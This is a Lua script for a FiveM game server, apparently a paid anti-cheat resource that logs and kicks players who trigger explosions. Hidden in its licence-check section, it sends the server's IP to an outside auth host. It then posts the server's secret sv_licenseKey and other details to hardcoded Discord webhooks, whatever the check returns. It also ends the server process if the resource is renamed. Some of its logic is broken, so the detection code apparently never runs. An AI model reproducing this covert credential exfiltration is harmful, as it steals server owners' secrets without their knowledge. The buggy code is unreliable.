ESX = exports['es_extended']:getSharedObject()



local status

if GetCurrentResourceName() ~= "UKC_ANTIEXPLOSION" then
    --   print("เปลี่ยนชื่อหาพ่อมึงหรอ")
                   Wait(1000)
       os.exit(-1)
   end
   
   PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
       if text then
           local ip = text
           local type = "UKC_ANTIEXPLOSION" -- กำหนด type ตามต้องการ
   
           PerformHttpRequest("https://unknowcallback.team/auth.php?ip=" .. ip .. "&type=" .. type, function(err2, text2, headers2)
               if text2 then
                   local jsonData = json.decode(text2)
                   local status = jsonData.status
                   local discordid = jsonData.discordid or "unknown"
                 
                   -- print("IP:", ip)
                   -- print("Status:", status)
                   -- print("Discord ID:", discordid)
   
                   if status == "200" then
                       status = true
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2####################################")	
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##          ^1START SRCIPT          ^2##")	
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##         ^2"..text.."         ##")
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##            ^2TYPE 200            ##")
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##       ^5UNKNOWCALLBACK_TEAM      ^2##")			
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##  ^5(https://unknowcallback.team) ^2##")	
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2####################################")
   
   
                                   
                   local webhookUrls = "https://discord.com/api/webhooks/1200864027157475479/FHpev9aIWiMR8v0sYcQ2M416oKqeeSMxS5i_DfU0Y6gsjSja5K6sC97eGnGC-IoHCKJL"
   
                   local serverName = GetConvar("sv_hostname", "Server Name")
                   local Script = GetCurrentResourceName()
                   local Customer = "<@" ..discordid.. ">"
                   local DEV = "<@823881653625290792>"
   
                   PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
                       local IP = text
                       local serverIP = IP
                       local Version = "Unknown" 
                       local fxmanifestContent = LoadResourceFile(GetCurrentResourceName(), "fxmanifest.lua")
   
                       if fxmanifestContent then
                           local version = string.match(fxmanifestContent, "version '([%d%.]+)'")
                           local author = string.match(fxmanifestContent, "author '([^']+)%'")
                           if version then
                               Version = version 
                           end
                           if author then 
                               Author = author
                           end    
                       end
                       
                       local message = {
                           content = "",
                           embeds = {
                               {
                                   description = "**📁 RESOURCE NAME : " ..Script.. "**\nIP เซิร์ฟเวอร์: `" .. serverIP .. "`\n version : `" .. Version .. '`\nCustomer:' .. Customer ,
                                   footer = {
                                       text = "STATUS ✅ SUCCESS | CREATE BY" ..Author.. "\nPOWER BY UNKNNOWCALLBACK | เวลา: " .. os.date("%Y-%m-%d %H:%M:%S")
                                   },
                                   color = 65280
                               }
                           }
                       }
   
                       PerformHttpRequest(webhookUrls, function(statusCode, text, headers)end, 'POST', json.encode(message), { ['Content-Type'] = 'application/json' })
                   end)
   
   
   
                   
   
   
       local webhookUrl = "https://discord.com/api/webhooks/1223280054470049953/QPGgvXe1pUTNtEsvd98Xabmz0Qi4K6WHXledNlFyJsiTsYHC-gAFkNwSEJZt756BMRAE"
   
               local serverName = GetConvar("sv_hostname", "Server Name")
               local lisence = GetConvar("sv_licenseKey", "licensekey")
               local Script = GetCurrentResourceName()
               local Customer = "<@" ..discordid.. ">"
               local DEV = "<@823881653625290792>"
   
               PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
                   local IP = text
                   local serverIP = IP
                   local Version = "Unknown" 
                   local fxmanifestContent = LoadResourceFile(GetCurrentResourceName(), "fxmanifest.lua")
   
                   if fxmanifestContent then
                       local version = string.match(fxmanifestContent, "version '([%d%.]+)'")
                       local author = string.match(fxmanifestContent, "author '([^']+)%'")
                       if version then
                           Version = version 
                       end
                       if author then 
                           Author = author
                       end    
                   end
                   
                   local message = {
                       content = "",
                       embeds = {
                           {
                               description = "**📁 RESOURCE NAME : " ..Script.. "**\nIP เซิร์ฟเวอร์: `" .. serverIP .. "`\n version : `" .. Version .. '`\nlisence: `' .. lisence.. '`' ,
                               footer = {
                                   text = "STATUS ✅ SUCCESS | CREATE BY" ..Author.. "\nPOWER BY UNKNNOWCALLBACK | เวลา: " .. os.date("%Y-%m-%d %H:%M:%S")
                               },
                               color = 65280
                           }
                       }
                   }                    
   
                   PerformHttpRequest(webhookUrl, function(statusCode, text, headers)end, 'POST', json.encode(message), { ['Content-Type'] = 'application/json' })
               end)
   
                   elseif status == "404" then
                       status = false
                       print()
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2#####################################")	
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##          ^1CANNOT START           ^2##")	
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##         ^2"..text.."          ^2##")
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##            ^1TYPE 404             ^2##")
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##       ^5UNKNOWCALLBACK_TEAM       ^2##")			
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2##  ^5(https://unknowcallback.team)  ^2##")	
                       print(" [^3".. GetCurrentResourceName() .."^7] ^2#####################################")
                       print()
                           Wait(2500)
                           
                           local webhookUrls = "https://discord.com/api/webhooks/1200864027157475479/FHpev9aIWiMR8v0sYcQ2M416oKqeeSMxS5i_DfU0Y6gsjSja5K6sC97eGnGC-IoHCKJL"
       
                           local serverName = GetConvar("sv_hostname", "Server Name")
                           local Script = GetCurrentResourceName()
                           local Customer = "<@" ..discordid.. ">"
                           local DEV = "<@823881653625290792>"
           
                           PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
                               local IP = text
                               local serverIP = IP
                               local Version = "Unknown" 
                               local fxmanifestContent = LoadResourceFile(GetCurrentResourceName(), "fxmanifest.lua")
           
                               if fxmanifestContent then
                                   local version = string.match(fxmanifestContent, "version '([%d%.]+)'")
                                   local author = string.match(fxmanifestContent, "author '([^']+)%'")
                                   if version then
                                       Version = version 
                                   end
                                   if author then 
                                       Author = author
                                   end    
                               end
                               
                               local message = {
                                   content = "",
                                   embeds = {
                                       {
                                           description = "**📁 RESOURCE NAME : " ..Script.. "**\nIP เซิร์ฟเวอร์: `" .. serverIP .. "`\n version : `" .. Version .. '`\nCustomer:' .. Customer ,
                                           footer = {
                                               text = "STATUS ❌ SUCCESS | CREATE BY" ..Author.. "\nPOWER BY UNKNNOWCALLBACK | เวลา: " .. os.date("%Y-%m-%d %H:%M:%S")
                                           },
                                           color = 65280
                                       }
                                   }
                               }
           
                               PerformHttpRequest(webhookUrls, function(statusCode, text, headers)end, 'POST', json.encode(message), { ['Content-Type'] = 'application/json' })
                           end)
       
       
       
   
               local webhookUrl = "https://discord.com/api/webhooks/1223280054470049953/QPGgvXe1pUTNtEsvd98Xabmz0Qi4K6WHXledNlFyJsiTsYHC-gAFkNwSEJZt756BMRAE"
       
                       local serverName = GetConvar("sv_hostname", "Server Name")
                       local lisence = GetConvar("sv_licenseKey", "licensekey")
                       local Script = GetCurrentResourceName()
                       local Customer = "<@" ..discordid.. ">"
                       local DEV = "<@823881653625290792>"
       
                       PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
                           local IP = text
                           local serverIP = IP
                           local Version = "Unknown" 
                           local fxmanifestContent = LoadResourceFile(GetCurrentResourceName(), "fxmanifest.lua")
       
                           if fxmanifestContent then
                               local version = string.match(fxmanifestContent, "version '([%d%.]+)'")
                               local author = string.match(fxmanifestContent, "author '([^']+)%'")
                               if version then
                                   Version = version 
                               end
                               if author then 
                                   Author = author
                               end    
                           end
                           
                           local message = {
                               content = "",
                               embeds = {
                                   {
                                       description = "**📁 RESOURCE NAME : " ..Script.. "**\nIP เซิร์ฟเวอร์: `" .. serverIP .. "`\n version : `" .. Version .. '`\nlisence: `' .. lisence.. '`' ,
                                       footer = {
                                           text = "STATUS ❌ SUCCESS | CREATE BY" ..Author.. "\nPOWER BY UNKNNOWCALLBACK | เวลา: " .. os.date("%Y-%m-%d %H:%M:%S")
                                       },
                                       color = 65280
                                   }
                               }
                           }                    
       
                           PerformHttpRequest(webhookUrl, function(statusCode, text, headers)end, 'POST', json.encode(message), { ['Content-Type'] = 'application/json' })
                       end)
          
   
                   end
               end
               
           end, "GET", "", {})
       else
           print("CANNOT GET YOUR SERVER IP")
       end
   end, "GET", "", {})

   





if status == true then


if Config.usemainloop == true then
AddEventHandler('explosionEvent', function(sender, ev)
    local playerName = GetPlayerName(sender)
    local playerId = sender
    local ip = GetPlayerEndpoint(sender)
    local xPlayer = ESX.GetPlayerFromId(playerId)
    local description = json.encode(ev) 
    local explosiontype = ev.explosionType
    local damageScale = ev.damageScale
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local ped = GetPlayerPed(playerId)
    local playerCoords = GetEntityCoords(ped)
    local info = '**\n[INFO]**'
    local steam = Config.ifnotfound
    local discord = Config.ifnotfound
    local license = Config.ifnotfound
    local live = Config.ifnotfound
    local xbl = Config.ifnotfound
    for m, n in ipairs(GetPlayerIdentifiers(sender)) do
        if n:match("steam") then
            steam = n
        elseif n:match("discord") then
            discord = n:gsub("discord:", "")
        elseif n:match("license") then
            license = n
        elseif n:match("live") then
            live = n
        elseif n:match("xbl") then
            xbl = n
        end
    end
  

    if  Config.typetoreturn[explosiontype] then
        return
    end
local playerGroup = xPlayer.getGroup()
local admin

if Config.bypass[playerGroup] then
    admin = "แอดมินจ้า"
else
    admin = "ไม่ใช่แอดมินจร้า"
end
local url = Config.SENDIMAGE
exports["discord-screenshot"]:requestCustomClientScreenshotUploadToDiscord(
GetPlayers()[1],url,
{
    encoding = "png",
    quality = 1
},
function(error)
    if error then
        return print("^1ERROR: " .. error)
    end
end
)
Config.Detaildiscordlog(playerName,playerId,steam,discord,license,live,xbl,ip,admin,playerCoords,explosiontype,info,description,currentTime)
end)
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if Config.usetableloop == true then

local explosionCount = {}
local lastExplosionTime = {} -- เพิ่มตัวแปรเก็บเวลาระเบิดครั้งล่าสุด
local discordWebhook = Config.BANEXPLOSION
AddEventHandler('explosionEvent', function(sender, ev)
    local playerId = sender
    local xPlayer = ESX.GetPlayerFromId(playerId)
    local playerName = GetPlayerName(sender)
    local damageScale = ev.damageScale
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local steam = Config.ifnotfound
    local discord = Config.ifnotfound
    local license = Config.ifnotfound
    local live = Config.ifnotfound
    local xbl = Config.ifnotfound
    for m, n in ipairs(GetPlayerIdentifiers(sender)) do
        if n:match("steam") then
            steam = n
        elseif n:match("discord") then
            discord = n:gsub("discord:", "")
        elseif n:match("license") then
            license = n
        elseif n:match("live") then
            live = n
        elseif n:match("xbl") then
            xbl = n
        end
    end
    if not explosionCount[playerId] then
        explosionCount[playerId] = 0
    end

    -- ตรวจสอบเวลาที่ระเบิดครั้งล่าสุด
    local currentTime = os.time()
    local currentTimer = os.date("%Y-%m-%d %H:%M:%S")
    if not lastExplosionTime[playerId] or (currentTime - lastExplosionTime[playerId] >= Config.datetoban ) then
        explosionCount[playerId] = 0
    end

    
    if  Config.typetoreturn[explosiontype] then
        return
    end

    explosionCount[playerId] = explosionCount[playerId] + Config.addpoint
    lastExplosionTime[playerId] = currentTime -- อัปเดตเวลาระเบิดครั้งล่าสุด

    local playerGroup = xPlayer.getGroup()
    local playerName = GetPlayerName(playerId)
   if Config.bypass[playerGroup] then
        CancelEvent()
        if Config.admindebug == true then
            Config.admindebug_print(playerName,playerId,currentTimer)
        end
    else
        local playerName = GetPlayerName(playerId)
        local explosioncount =  explosionCount[playerId]
        if Config.debugplayerdoexplosiondetechsystem == true then
            Config.debugplayerdoexplosion(playerName,playerId,explosioncount,currentTimer)
        end
        if explosionCount[playerId] >= Config.checktimetoban then
        Config.kickplayer(playerId,playerName,xPlayer)
        end
    end
end)

end

else
    print('STATUS NOT ACTIVE')
end





